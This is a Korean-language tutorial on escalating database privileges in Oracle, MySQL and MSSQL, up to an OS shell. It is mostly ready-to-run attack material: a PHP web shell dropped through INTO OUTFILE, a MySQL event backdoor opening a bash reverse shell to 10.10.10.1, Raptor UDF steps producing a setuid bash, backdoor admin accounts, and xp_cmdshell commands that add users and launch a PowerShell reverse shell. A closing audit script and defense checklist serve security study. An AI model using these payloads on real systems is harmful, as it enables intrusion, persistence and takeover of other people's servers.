# DB 권한 상승 — 저권한 계정에서 DBA/OS까지

## 1. 권한 상승 경로

```
일반 계정
    ↓  역할(ROLE) 남용
    ↓  저장 프로시저 취약점
    ↓  SQLi → DB 계정 탈취
DBA 계정
    ↓  UDF / Job / extproc
    ↓  파일 읽기/쓰기
OS 쉘 (DB 서비스 계정 권한)
    ↓  로컬 권한 상승 (별도 단계)
root / SYSTEM
```

---

## 2. Oracle 권한 상승

### 2-1. 현재 권한 및 역할 확인

```sql
-- 현재 사용자
SELECT USER FROM DUAL;

-- 현재 사용자의 시스템 권한
SELECT PRIVILEGE FROM SESSION_PRIVS;

-- 현재 사용자의 역할
SELECT GRANTED_ROLE FROM SESSION_ROLES;

-- DBA 역할 보유 사용자 목록
SELECT GRANTEE FROM DBA_ROLE_PRIVS WHERE GRANTED_ROLE = 'DBA';

-- 실행 가능한 프로시저 목록
SELECT OBJECT_NAME, OBJECT_TYPE FROM ALL_OBJECTS
WHERE OBJECT_TYPE IN ('PROCEDURE','FUNCTION','PACKAGE')
AND OWNER != USER;
```

### 2-2. CREATE ANY PROCEDURE 악용

```sql
-- CREATE ANY PROCEDURE 권한이 있으면 SYS 소유 프로시저 덮어쓰기 가능
-- 대상: 취약한 Oracle 버전 (11.2 이하 일부)

-- 권한 확인
SELECT PRIVILEGE FROM SESSION_PRIVS WHERE PRIVILEGE LIKE '%PROCEDURE%';

-- SYS.GRANT_DBA 프로시저 악용 예시 (패치 전 버전)
CREATE OR REPLACE PROCEDURE sys.evil_proc AUTHID CURRENT_USER AS
BEGIN
  EXECUTE IMMEDIATE 'GRANT DBA TO ' || USER;
END;
/
```

### 2-3. DBMS_XMLQUERY / DBMS_METADATA 인젝션

```sql
-- DBMS_XMLQUERY를 통한 권한 상승 (CVE-2010-3600 등)
-- 파라미터 인젝션으로 SYS 컨텍스트에서 쿼리 실행

-- 패치 확인: DBA_REGISTRY에서 컴포넌트 버전 확인
SELECT COMP_NAME, VERSION, STATUS FROM DBA_REGISTRY
WHERE COMP_NAME LIKE '%XML%';
```

### 2-4. 저장 프로시저 내 SQLi (Second-Order)

```sql
-- 프로시저 내부에 동적 SQL이 있을 경우
-- 입력값이 검증 없이 EXECUTE IMMEDIATE에 들어가는 패턴

-- 취약한 예시
CREATE OR REPLACE PROCEDURE get_user_data(p_name IN VARCHAR2) AS
  v_sql VARCHAR2(200);
BEGIN
  v_sql := 'SELECT * FROM users WHERE name = ''' || p_name || '''';
  EXECUTE IMMEDIATE v_sql;  -- SQLi 가능
END;

-- 공격
EXEC get_user_data(q'[' UNION SELECT 1,user,3 FROM dual--]');
```

---

## 3. MySQL 권한 상승

### 3-1. 현재 권한 확인

```sql
-- 현재 사용자 권한
SHOW GRANTS FOR CURRENT_USER();

-- 글로벌 권한 확인 (SUPER, FILE 등)
SELECT user, Super_priv, File_priv, Execute_priv
FROM mysql.user WHERE user = CURRENT_USER();
```

### 3-2. MySQL 취약한 설정 악용

```sql
-- 1. FILE 권한 → 웹쉘 / 설정 파일 읽기
SELECT LOAD_FILE('/etc/mysql/my.cnf');
SELECT '<?php @eval($_POST[0]);?>' INTO OUTFILE '/var/www/html/sh.php';

-- 2. 함수 경로 트릭 (secure_file_priv = '' 일 때)
SELECT @@datadir;       -- /var/lib/mysql/
SELECT @@basedir;       -- /usr/

-- 3. 이벤트 스케줄러 악용 (EVENT 권한)
SET GLOBAL event_scheduler = ON;
CREATE EVENT backdoor
ON SCHEDULE EVERY 1 SECOND
DO CALL sys_exec('bash -i >& /dev/tcp/10.10.10.1/4444 0>&1');
```

### 3-3. MySQL 8.x 계정 조작

```sql
-- 플러그인 우회 (caching_sha2_password → mysql_native_password)
ALTER USER 'root'@'localhost'
  IDENTIFIED WITH mysql_native_password BY 'newpass';

-- 백도어 계정 생성 (root 접근 후)
CREATE USER 'backdoor'@'%' IDENTIFIED BY 'P@ssw0rd!';
GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'%' WITH GRANT OPTION;
FLUSH PRIVILEGES;
```

### 3-4. Raptor_UDF2 기법 (고전 MySQL 권한 상승)

```bash
# 도구 준비
git clone https://github.com/RalfHacker/raptor_udf2.git
gcc -shared -fPIC raptor_udf2.c -o raptor_udf2.so

# MySQL 로그인 후
mysql -u root -p
```

```sql
USE mysql;
CREATE TABLE foo(line BLOB);
INSERT INTO foo VALUES(LOAD_FILE('/tmp/raptor_udf2.so'));
SELECT * FROM foo INTO DUMPFILE '/usr/lib/mysql/plugin/raptor_udf2.so';
CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so';
SELECT do_system('id > /tmp/out && chmod 755 /tmp/out');
SELECT do_system('cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash');
```

---

## 4. MSSQL 권한 상승

### 4-1. xp_cmdshell 활성화 및 명령 실행

```sql
-- xp_cmdshell 활성화 (sysadmin 필요)
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- 명령 실행
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'net user hacker P@ss123 /add';
EXEC xp_cmdshell 'net localgroup administrators hacker /add';

-- 리버스 쉘
EXEC xp_cmdshell 'powershell -nop -c "$c=New-Object Net.Sockets.TCPClient(\"10.10.10.1\",4444);..."';
```

### 4-2. Linked Server 악용

```sql
-- 링크드 서버 목록
SELECT name, provider FROM sys.servers WHERE is_linked = 1;

-- 원격 DB에서 명령 실행
EXEC ('xp_cmdshell ''whoami''') AT [linked_server_name];

-- 링크드 서버 체인으로 권한 상승
-- A서버(저권한) → B서버(고권한) 로 이동 가능
```

### 4-3. Impersonation (사용자 가장)

```sql
-- 가장할 수 있는 사용자 확인
SELECT DISTINCT b.name
FROM sys.database_permissions a
JOIN sys.database_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';

-- 가장 실행 후 권한 상승
EXECUTE AS LOGIN = 'sa';
EXEC xp_cmdshell 'whoami';
REVERT;
```

---

## 5. 자동화 — DB 권한 점검 도구

```python
import pymysql
import cx_Oracle
import argparse
import sys
from dataclasses import dataclass, field

@dataclass
class PrivEscResult:
    user: str
    db_type: str
    dangerous_privs: list[str] = field(default_factory=list)
    escalation_paths: list[str] = field(default_factory=list)

def check_mysql_privs(host: str, user: str, password: str) -> PrivEscResult:
    result = PrivEscResult(user=user, db_type="MySQL")
    try:
        conn = pymysql.connect(host=host, user=user, password=password, db='mysql')
        cur = conn.cursor()

        # 위험 권한 확인
        danger_privs = ["Super_priv", "File_priv", "Execute_priv",
                        "Create_routine_priv", "Alter_routine_priv",
                        "Create_user_priv", "Repl_slave_priv"]
        cur.execute(f"SELECT {','.join(danger_privs)} FROM user WHERE user=%s", (user,))
        row = cur.fetchone()
        if row:
            for i, priv in enumerate(danger_privs):
                if row[i] == 'Y':
                    result.dangerous_privs.append(priv)

        # 권한 상승 경로 판단
        if "File_priv" in result.dangerous_privs:
            result.escalation_paths.append("FILE priv → LOAD_FILE / INTO OUTFILE")
        if "Super_priv" in result.dangerous_privs:
            result.escalation_paths.append("SUPER priv → UDF 로드, 이벤트 스케줄러")
        if "Execute_priv" in result.dangerous_privs:
            result.escalation_paths.append("EXECUTE priv → UDF sys_exec 실행 가능")

        # UDF 함수 존재 확인
        cur.execute("SELECT name FROM mysql.func WHERE ret=0")
        udfs = [r[0] for r in cur.fetchall()]
        if udfs:
            result.escalation_paths.append(f"UDF 함수 발견: {udfs}")

        cur.close()
        conn.close()
    except Exception as e:
        result.escalation_paths.append(f"연결 실패: {e}")
    return result

def print_result(r: PrivEscResult) -> None:
    print(f"\n[{r.db_type}] 사용자: {r.user}")
    print(f"  위험 권한: {r.dangerous_privs or '없음'}")
    if r.escalation_paths:
        print("  권한 상승 경로:")
        for path in r.escalation_paths:
            print(f"    → {path}")
    else:
        print("  권한 상승 경로: 발견 없음")

def main() -> None:
    parser = argparse.ArgumentParser(description="DB 권한 점검 도구")
    parser.add_argument("--host", required=True)
    parser.add_argument("--user", required=True)
    parser.add_argument("--password", required=True)
    parser.add_argument("--db-type", choices=["mysql", "oracle"], default="mysql")
    args = parser.parse_args()

    if args.db_type == "mysql":
        result = check_mysql_privs(args.host, args.user, args.password)
        print_result(result)
    else:
        print("Oracle 점검은 DBA 계정 필요")

if __name__ == "__main__":
    main()
```

---

## 6. 권한 상승 방어

```
공통 원칙:
  □ 최소 권한 원칙 — 앱 계정에 SELECT/INSERT만 부여
  □ DBA/SA 계정 일상적 사용 금지
  □ 저장 프로시저 AUTHID DEFINER 대신 CURRENT_USER 사용
  □ 동적 SQL 파라미터 바인딩 필수 (문자열 연결 금지)

Oracle 전용:
  □ PUBLIC 역할에서 불필요 패키지 REVOKE
  □ EXECUTE ANY PROCEDURE 권한 제거
  □ Java 스토어드 프로시저 불필요 시 비활성화

MySQL 전용:
  □ plugin_dir 권한을 root만 쓰기 가능으로 제한
  □ event_scheduler 기본 OFF
  □ FILE 권한 최소화, secure_file_priv 설정

MSSQL 전용:
  □ xp_cmdshell 기본 비활성화 유지
  □ Linked Server 최소화 및 보안 설정 강화
  □ Impersonation 권한 감사
```
